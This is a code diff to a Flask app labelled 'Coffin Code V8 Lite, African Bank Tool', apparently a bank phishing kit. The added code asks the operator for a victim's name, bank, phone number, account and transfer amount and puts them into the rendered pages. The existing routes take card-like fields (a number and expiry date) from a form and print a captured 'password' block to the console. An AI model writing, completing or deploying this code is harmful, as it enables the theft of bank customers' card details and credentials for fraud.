@@ -17,11 +17,11 @@ from flask_mail import Mail, Message
 from form_contact import ContactForm, csrf
 from flask import Flask, render_template, request, redirect
 
-
 os.system("clear")
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 my_system = platform.uname()
+
 app = Flask(__name__)
 SECRET_KEY = os.urandom(32)
 app.config['SECRET_KEY'] = SECRET_KEY
@@ -29,16 +29,39 @@ csrf.init_app(app)
 app.config['UPLOAD_FOLDER'] = 'test_images'
 app.secret_key = 'blahblahuploaderblahhhh'
 
+print('''\033[91m
+                    ──────▄▀▄─────▄▀▄
+                    ─────▄█░░▀▀▀▀▀░░█▄
+                    ─▄▄──█░░░░░░░░░░░█──▄▄
+ ___________________█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█____________________
+|                    Coffin Code V8 Lite                       |   
+|                                                              |
+| [>] African Bank Tool  (2022/08/08)                           |
+| [>] Created : SphaBSB and BSB-Developers                     |
+|______________________________________________________________|
+''')
+name = input("\033[92m Enter the victim name \n\033[91m $ ")
+bank = input("\033[93m Enter the Victim Bank \n E.g Capitec Bank \n\033[91m $ ")
+phone = input("\033[94m Enter the Victim Phone Numbers \n\033[91m $ ")
+account = input("\033[95m Enter the Victim Bank Account \n\033[91m $ ")
+amount = input("\033[92m Enter the Victime Amount Transferred \n\033[91m $ ")
+
 @app.route('/')
 def index():
+      lwrAlp = name
+      uprAlp = bank
+      numrAlp = phone
+      AccAlp = account 
+      amoAlp = amount
       form = ContactForm()
-      return render_template('contact.html', form=form)
+      return render_template('contact.html', form=form, lwrAlp=lwrAlp, uprAlp=uprAlp, numrAlp=numrAlp, AccAlp=AccAlp, amoAlp=amoAlp)
 
 
 @app.route('/contact', methods=['POST', 'GET'])
 def contact():
     form = ContactForm()
-    if form.validate_on_submit():
+  
+    if form.validate_on_submit(): 
         name = request.form['name']
         cnum = request.form['cnum']
         exd = request.form['exd']
@@ -82,6 +105,7 @@ def contact():
       
 @app.route('/success', methods=['POST', 'GET'])
 def success():
+    amoAlp = amount
     form = ContactForm()
     if form.validate_on_submit():        
         print('\033[91m---------password----------------')
@@ -89,7 +113,7 @@ def success():
         print('-------------------------')
         print(city)
         return redirect('/success')
-    return render_template('success.html', form=form)
+    return render_template('success.html', form=form,amoAlp=amoAlp)
 
 
 
